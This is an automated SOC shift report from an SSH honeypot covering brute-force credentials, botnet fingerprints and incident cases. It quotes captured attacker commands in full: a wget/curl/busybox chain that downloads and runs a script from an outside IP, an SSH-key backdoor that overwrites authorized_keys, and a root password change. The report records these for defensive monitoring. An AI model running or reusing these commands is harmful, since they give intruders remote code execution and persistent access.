# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-11-27 |
| **Generated At** | 2026-11-27T05:46:08Z |
| **Shift Time** | 05:46 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **150** |
| Confirmed Threats | **112** |
| False Positives Filtered | **38** (25.3%) |
| Unique Attacker IPs | **92** |
| Countries of Origin | **31** |
| High Severity Cases | **67** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **83** |
| Malware Samples Analyzed | **9** HIGH · **27** MED · 0 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **1260** |
| Unique Credential Pairs | **1071** |
| Unique Usernames | **337** |
| Unique Passwords | **751** |
| Successful Auth Pairs | **1229** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 443 |
| `ubuntu` | 210 |
| `admin` | 32 |
| `user` | 22 |
| `support` | 17 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `123456` | 57 |
| `123` | 33 |
| `1234` | 22 |
| `root` | 19 |
| `rootssssss23424123123` | 15 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `rootssssss23424123123` | `rootssssss23424123123` | 15 |
| `root` | `root3245gs5662d34111111111` | 14 |
| `support` | `support` | 11 |
| `root` | `calvin` | 8 |
| `admin` | `admin` | 8 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `ubuntu` | `Pa$$w0rt` | `10.0.0.73` | 2026-11-27T00:00:18 |
| `root` | `Aa123321` | `163.52.135.28` | 2026-11-27T00:00:30 |
| `ubuntu` | `Adm1n1$trat0r` | `177.75.235.46` | 2026-11-27T00:01:03 |
| `ubuntu` | `Adm1n1$trat0r` | `10.0.0.73` | 2026-11-27T00:03:27 |
| `ubuntu` | `123456a?` | `177.75.235.46` | 2026-11-27T00:04:12 |
| `root` | `calvin` | `191.217.250.87` | 2026-11-27T00:05:27 |
| `root` | `Aa123456789!` | `10.0.0.73` | 2026-11-27T00:05:48 |
| `ubuntu` | `123456a?` | `10.0.0.73` | 2026-11-27T00:06:33 |
| `ubuntu` | `Password0!` | `177.75.235.46` | 2026-11-27T00:07:21 |
| `ubuntu` | `Password0!` | `10.0.0.73` | 2026-11-27T00:09:40 |
| `ubuntu` | `12345678aA` | `177.75.235.46` | 2026-11-27T00:10:34 |
| `ubuntu` | `12345678aA` | `10.0.0.73` | 2026-11-27T00:12:53 |
| `root` | `1qazZAQ!` | `163.52.135.28` | 2026-11-27T00:13:17 |
| `ubuntu` | `1qaz2wsx.` | `177.75.235.46` | 2026-11-27T00:13:38 |
| `GET / HTTP/1.1` | `Host: 129.80.119.236:23` | `101.36.116.230` | 2026-11-27T00:14:23 |
| `ubuntu` | `1qaz2wsx.` | `10.0.0.73` | 2026-11-27T00:15:59 |
| `support` | `admin321` | `78.128.112.74` | 2026-11-27T00:16:46 |
| `support` | `adminmypc` | `78.128.112.74` | 2026-11-27T00:16:46 |
| `ubuntu` | `roz@#2536` | `177.75.235.46` | 2026-11-27T00:16:47 |
| `root` | `Qwer1234` | `10.0.0.73` | 2026-11-27T00:18:42 |
_… 1209 more successful pair(s) in credentials.json_

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **150** |
| Sessions with Fingerprint | **17** |
| Unique HASSH Fingerprints | **17** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 35 |
| Go SSH scanner | 25 |
| Unknown | 4 |
| Perl Net::SSH | 2 |
| Nmap scanner | 2 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 29 | 15 |
| `98ddc5604ef6...` | Modern SSH client | 9 | 2 |
| `16443846184e...` | Generic scanner | 3 | 2 |
| `eff4c24daffc...` | Modern SSH client | 3 | 1 |
| `0a07365cc01f...` | Generic scanner | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 29 | 15 | Mirai/variant |
| `98ddc5604ef6...` | Go SSH scanner | 9 | 2 | Modern SSH client |
| `95420f9d932d...` | libssh | 4 | 4 | — |
| `16443846184e...` | Go SSH scanner | 3 | 2 | Generic scanner |
| `eff4c24daffc...` | Go SSH scanner | 3 | 1 | Modern SSH client |
| `0a07365cc01f...` | Go SSH scanner | 3 | 1 | Generic scanner |
| `2ec37a7cc8da...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `3c0eaacec19b...` | Perl Net::SSH | 2 | 2 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **14** |
| Campaign Clusters | **6** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 7 | 1 | `T1105, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1083, T1140, T1059.004` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 15 | 14 | `T1021.004, T1078, T1070, T1140` |
| **Mirai/IoT Botnet** | 🔴 HIGH | 1 | 1 | `T1105, T1140, T1059.004` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:TNZrJxstIypx"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `154.51.59.118`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
echo W$((2+3))X
```
```
(2+3
```
```
echo WOKX
```
```
cd /tmp 2>/dev/null||cd /var/tmp 2>/dev/null||cd /dev/shm 2>/dev/null||cd .;rm -f r.sh;if command -v wget >/dev/null 2>&1; then wget -q --timeout=12 -O r.sh http://45.198.224.75/run.sh; fi;if [ ! -s r.sh ] && command -v curl >/dev/null 2>&1; then curl -fsS --max-time 15 -o r.sh http://45.198.224.75/run.sh; fi;if [ ! -s r.sh ] && command -v busybox >/dev/null 2>&1; then busybox wget -q -O r.sh http://45.198.224.75/run.sh; fi;[ -s r.sh ] || { echo __FAIL_DL__; exit 0; };chmod 777 r.sh 2>/dev/null; chmod +x r.
```
```
wc -c < r.sh 2 > /dev/null
```
Source IPs: `191.217.250.87`

**🔴 HIGH · Mirai/IoT Botnet**

> Mirai-family IoT botnet. Executes busybox payloads for DDoS bot recruitment.

Representative commands:
```
enable
```
```
linuxshell
```
```
system
```
```
sh
```
```
ls /home; /bin/busybox BOTNET
```
Source IPs: `160.119.66.206`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **92** |
| Unique ASNs | **40** |
| High-Risk ASNs | **30** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS0` |  | 28 | HIGH |
| `AS15169` | Google LLC | 7 | HIGH |
| `AS396982` | Google LLC | 7 | LOW |
| `AS213412` | ONYPHE SAS | 5 | LOW |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS25369` | Hydra Communications Ltd | 3 | LOW |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS8151` | Uninet S.A. de C.V. | 2 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (63)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-04c3d597fb3e

| Field | Detail |
|---|---|
| **Source IP** | `163.52.135[.]28` |
| **First Seen** | 2026-11-27 00:00 |
| **Last Seen** | 2026-11-27 00:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:00:28` | `cowrie.session.connect` |
| `2026-11-27 00:00:28` | `cowrie.client.version` |
| `2026-11-27 00:00:28` | `cowrie.client.kex` |
| `2026-11-27 00:00:30` | `cowrie.login.success` |
| `2026-11-27 00:00:31` | `cowrie.session.params` |
| `2026-11-27 00:00:31` | `cowrie.command.input` |
| `2026-11-27 00:00:31` | `cowrie.log.closed` |
| `2026-11-27 00:00:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.52.135[.]28` to AbuseIPDB if not already reported
- [ ] Block `163.52.135[.]28` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3b664799671d

| Field | Detail |
|---|---|
| **Source IP** | `177.75.235[.]46` |
| **First Seen** | 2026-11-27 00:00 |
| **Last Seen** | 2026-11-27 00:01 |
| **Session Duration** | 32s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:00:43` | `cowrie.session.connect` |
| `2026-11-27 00:00:48` | `cowrie.client.version` |
| `2026-11-27 00:00:48` | `cowrie.client.kex` |
| `2026-11-27 00:01:03` | `cowrie.login.success` |
| `2026-11-27 00:01:12` | `cowrie.session.params` |
| `2026-11-27 00:01:12` | `cowrie.command.input` |
| `2026-11-27 00:01:16` | `cowrie.log.closed` |
| `2026-11-27 00:01:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `177.75.235[.]46` to AbuseIPDB if not already reported
- [ ] Block `177.75.235[.]46` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f994321d0445

| Field | Detail |
|---|---|
| **Source IP** | `191.217.250[.]87` |
| **First Seen** | 2026-11-27 00:05 |
| **Last Seen** | 2026-11-27 00:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo W$((2+3))X, (2+3, echo WOKX, cd /tmp 2>/dev/null||cd /var/tmp 2>/dev/null||cd /dev/shm 2>/dev/null||cd .;rm -f r.sh;if command -v wget >/dev/null 2>&1; then wget -q --timeout=12 -O r.sh hxxp://45.198.224[.]75/run.sh; fi;if [ ! -s r.sh ] && command -v curl >/dev/null 2>&1; then curl -fsS --max-time 15 -o r.sh hxxp://45.198.224[.]75/run.sh; fi;if [ ! -s r.sh ] && command -v busybox >/dev/null 2>&1; then busybox wget -q -O r.sh hxxp://45.198.224[.]75/run.sh; fi;[ -s r.sh ] || { echo __FAIL_DL__; exit 0; };chmod 777 r.sh 2>/dev/null; chmod +x r., wc -c < r.sh 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1222.002 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:05:24` | `cowrie.session.connect` |
| `2026-11-27 00:05:27` | `cowrie.login.success` |
| `2026-11-27 00:05:27` | `cowrie.session.params` |
| `2026-11-27 00:05:27` | `cowrie.command.input` |
| `2026-11-27 00:05:27` | `cowrie.command.input` |
| `2026-11-27 00:05:27` | `cowrie.command.input` |
| `2026-11-27 00:05:27` | `cowrie.command.input` |
| `2026-11-27 00:05:28` | `cowrie.command.input` |
| `2026-11-27 00:05:28` | `cowrie.command.input` |
| `2026-11-27 00:05:28` | `cowrie.command.input` |
| `2026-11-27 00:05:28` | `cowrie.command.failed` |
| `2026-11-27 00:05:28` | `cowrie.command.failed` |
| `2026-11-27 00:05:28` | `cowrie.command.failed` |
| `2026-11-27 00:05:28` | `cowrie.command.failed` |
| `2026-11-27 00:05:28` | `cowrie.command.failed` |
| … | _9 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `191.217.250[.]87` to AbuseIPDB if not already reported
- [ ] Block `191.217.250[.]87` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-204684e82222

| Field | Detail |
|---|---|
| **Source IP** | `101.36.116[.]230` |
| **First Seen** | 2026-11-27 00:14 |
| **Last Seen** | 2026-11-27 00:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `Accept: */*` |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:14:23` | `cowrie.session.connect` |
| `2026-11-27 00:14:23` | `cowrie.login.success` |
| `2026-11-27 00:14:23` | `cowrie.session.params` |
| `2026-11-27 00:14:23` | `cowrie.command.input` |
| `2026-11-27 00:14:23` | `cowrie.command.failed` |
| `2026-11-27 00:14:23` | `cowrie.command.input` |
| `2026-11-27 00:14:23` | `cowrie.log.closed` |
| `2026-11-27 00:14:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.116[.]230` to AbuseIPDB if not already reported
- [ ] Block `101.36.116[.]230` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61f1b7ebd5ec

| Field | Detail |
|---|---|
| **Source IP** | `78.128.112[.]74` |
| **First Seen** | 2026-11-27 00:16 |
| **Last Seen** | 2026-11-27 00:16 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo 'SSH check'` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:16:46` | `cowrie.session.connect` |
| `2026-11-27 00:16:46` | `cowrie.client.version` |
| `2026-11-27 00:16:46` | `cowrie.client.kex` |
| `2026-11-27 00:16:46` | `cowrie.login.success` |
| `2026-11-27 00:16:47` | `cowrie.session.params` |
| `2026-11-27 00:16:47` | `cowrie.command.input` |
| `2026-11-27 00:16:47` | `cowrie.log.closed` |
| `2026-11-27 00:16:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `78.128.112[.]74` to AbuseIPDB if not already reported
- [ ] Block `78.128.112[.]74` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2f29f50e0b2

| Field | Detail |
|---|---|
| **Source IP** | `43.161.196[.]76` |
| **First Seen** | 2026-11-27 00:31 |
| **Last Seen** | 2026-11-27 00:31 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:31:40` | `cowrie.session.connect` |
| `2026-11-27 00:31:40` | `cowrie.client.version` |
| `2026-11-27 00:31:40` | `cowrie.client.kex` |
| `2026-11-27 00:31:41` | `cowrie.login.success` |
| `2026-11-27 00:31:42` | `cowrie.session.params` |
| `2026-11-27 00:31:42` | `cowrie.command.input` |
| `2026-11-27 00:31:42` | `cowrie.command.failed` |
| `2026-11-27 00:31:42` | `cowrie.log.closed` |
| `2026-11-27 00:31:43` | `cowrie.session.params` |
| `2026-11-27 00:31:43` | `cowrie.command.input` |
| `2026-11-27 00:31:43` | `cowrie.session.file_download` |
| `2026-11-27 00:31:43` | `cowrie.log.closed` |
| `2026-11-27 00:31:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.161.196[.]76` to AbuseIPDB if not already reported
- [ ] Block `43.161.196[.]76` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb7b208e025c

| Field | Detail |
|---|---|
| **Source IP** | `43.161.196[.]76` |
| **First Seen** | 2026-11-27 00:31 |
| **Last Seen** | 2026-11-27 00:31 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:31:43` | `cowrie.session.connect` |
| `2026-11-27 00:31:43` | `cowrie.client.version` |
| `2026-11-27 00:31:44` | `cowrie.client.kex` |
| `2026-11-27 00:31:45` | `cowrie.login.success` |
| `2026-11-27 00:31:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.161.196[.]76` to AbuseIPDB if not already reported
- [ ] Block `43.161.196[.]76` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-093856c066ae

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]63` |
| **First Seen** | 2026-11-27 00:48 |
| **Last Seen** | 2026-11-27 00:48 |
| **Session Duration** | 20s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_fa2ca0698a62f6eec34cae7249eb7e8e_small_control'"'"' '"'"'check_fa2ca0698a62f6eec34cae7249eb7e8e'"'"'', printf '\n%s|%s\n' 'check_fa2ca0698a62f6eec34cae7249eb7e8e_small_control' 'check_fa2ca0698a62f6eec34cae7249eb7e8e', sh -c 'printf '"'"'\n%s|%s\n'"'"' '"'"'check_fa2ca0698a62f6eec34cae7249eb7e8e_small_math'"'"' "$((237*435+25))"', (237*435+25, printf '\n%s|%s\n' 'check_fa2ca0698a62f6eec34cae7249eb7e8e_small_math' ")"` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:48:20` | `cowrie.session.connect` |
| `2026-11-27 00:48:21` | `cowrie.client.version` |
| `2026-11-27 00:48:21` | `cowrie.client.kex` |
| `2026-11-27 00:48:26` | `cowrie.login.success` |
| `2026-11-27 00:48:28` | `cowrie.client.size` |
| `2026-11-27 00:48:30` | `cowrie.session.params` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| `2026-11-27 00:48:34` | `cowrie.command.input` |
| … | _47 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]63` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]63` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cbd384e98c3

| Field | Detail |
|---|---|
| **Source IP** | `14.194.125[.]58` |
| **First Seen** | 2026-11-27 00:48 |
| **Last Seen** | 2026-11-27 00:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:48:28` | `cowrie.session.connect` |
| `2026-11-27 00:48:28` | `cowrie.client.version` |
| `2026-11-27 00:48:28` | `cowrie.client.kex` |
| `2026-11-27 00:48:29` | `cowrie.login.success` |
| `2026-11-27 00:48:30` | `cowrie.session.params` |
| `2026-11-27 00:48:30` | `cowrie.command.input` |
| `2026-11-27 00:48:30` | `cowrie.command.failed` |
| `2026-11-27 00:48:31` | `cowrie.log.closed` |
| `2026-11-27 00:48:32` | `cowrie.session.params` |
| `2026-11-27 00:48:32` | `cowrie.command.input` |
| `2026-11-27 00:48:32` | `cowrie.session.file_download` |
| `2026-11-27 00:48:32` | `cowrie.log.closed` |
| `2026-11-27 00:48:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.125[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.194.125[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fbce01b712a

| Field | Detail |
|---|---|
| **Source IP** | `14.194.125[.]58` |
| **First Seen** | 2026-11-27 00:48 |
| **Last Seen** | 2026-11-27 00:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:48:32` | `cowrie.session.connect` |
| `2026-11-27 00:48:32` | `cowrie.client.version` |
| `2026-11-27 00:48:32` | `cowrie.client.kex` |
| `2026-11-27 00:48:33` | `cowrie.login.success` |
| `2026-11-27 00:48:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `14.194.125[.]58` to AbuseIPDB if not already reported
- [ ] Block `14.194.125[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fef1c4236478

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-11-27 00:49 |
| **Last Seen** | 2026-11-27 00:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:49:29` | `cowrie.session.connect` |
| `2026-11-27 00:49:29` | `cowrie.client.version` |
| `2026-11-27 00:49:29` | `cowrie.client.kex` |
| `2026-11-27 00:49:29` | `cowrie.login.success` |
| `2026-11-27 00:49:29` | `cowrie.direct-tcpip.request` |
| `2026-11-27 00:49:29` | `cowrie.direct-tcpip.data` |
| `2026-11-27 00:49:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61167f273cf8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]63` |
| **First Seen** | 2026-11-27 00:51 |
| **Last Seen** | 2026-11-27 00:51 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:51:29` | `cowrie.session.connect` |
| `2026-11-27 00:51:30` | `cowrie.client.version` |
| `2026-11-27 00:51:30` | `cowrie.client.kex` |
| `2026-11-27 00:51:37` | `cowrie.login.success` |
| `2026-11-27 00:51:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]63` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]63` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ed92764097be

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]78` |
| **First Seen** | 2026-11-27 00:55 |
| **Last Seen** | 2026-11-27 00:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 00:55:41` | `cowrie.session.connect` |
| `2026-11-27 00:55:42` | `cowrie.login.success` |
| `2026-11-27 00:55:42` | `cowrie.session.params` |
| `2026-11-27 00:55:42` | `cowrie.log.closed` |
| `2026-11-27 00:55:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]78` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]78` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab372c7ff399

| Field | Detail |
|---|---|
| **Source IP** | `88.96.39[.]28` |
| **First Seen** | 2026-11-27 01:38 |
| **Last Seen** | 2026-11-27 01:38 |
| **Session Duration** | 9s |
| **Login Attempts** | 2 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `/ip cloud print, ifconfig, uname -a, cat /proc/cpuinfo, ps | grep '[Mm]iner'` |
| **TTPs (MITRE)** | T1057 · T1078 · T1083 · T1110.001 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-11-27 01:38:29` | `cowrie.session.connect` |
| `2026-11-27 01:38:29` | `cowrie.client.version` |
| `2026-11-27 01:38:29` | `cowrie.client.kex` |
| `2026-11-27 01:38:30` | `cowrie.login.failed` |
| `2026-11-27 01:38:31` | `cowrie.login.success` |
| `2026-11-27 01:38:31` | `cowrie.session.params` |
| `2026-11-27 01:38:31` | `cowrie.command.input` |
| `2026-11-27 01:38:31` | `cowrie.command.failed` |
| `2026-11-27 01:38:32` | `cowrie.log.closed` |
| `2026-11-27 01:38:32` | `cowrie.session.params` |
| `2026-11-27 01:38:32` | `cowrie.command.input` |
| `2026-11-27 01:38:32` | `cowrie.log.closed` |
| `2026-11-27 01:38:33` | `cowrie.session.params` |
| `2026-11-27 01:38:33` | `cowrie.command.input` |
| `2026-11-27 01:38:33` | `cowrie.log.closed` |
| … | _19 more event(s) — see ir_cases.json_ |

**Recommended Actions:**
